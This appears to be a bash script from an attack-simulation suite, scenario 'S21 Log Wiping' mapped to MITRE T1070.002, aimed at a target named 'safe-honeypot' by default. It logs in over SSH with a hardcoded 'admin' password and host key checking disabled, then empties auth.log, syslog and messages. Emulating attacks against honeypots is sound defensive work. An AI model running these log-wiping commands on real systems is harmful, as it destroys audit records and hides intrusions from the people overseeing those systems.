#!/usr/bin/env bash
# S21 — Log Wiping
# Tactic : Defense Evasion (TA0005)
# Technique: T1070.002 Indicator Removal: Clear Linux or Mac System Logs
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S21 Log Wiping — ${TARGET} ==="
$SSH "ls -lh /var/log/; cat /dev/null > /var/log/auth.log; cat /dev/null > /var/log/syslog; cat /dev/null > /var/log/messages 2>/dev/null; ls -lh /var/log/ | grep -E 'auth|sys'" && echo "[OK]" || echo "[FAIL]"
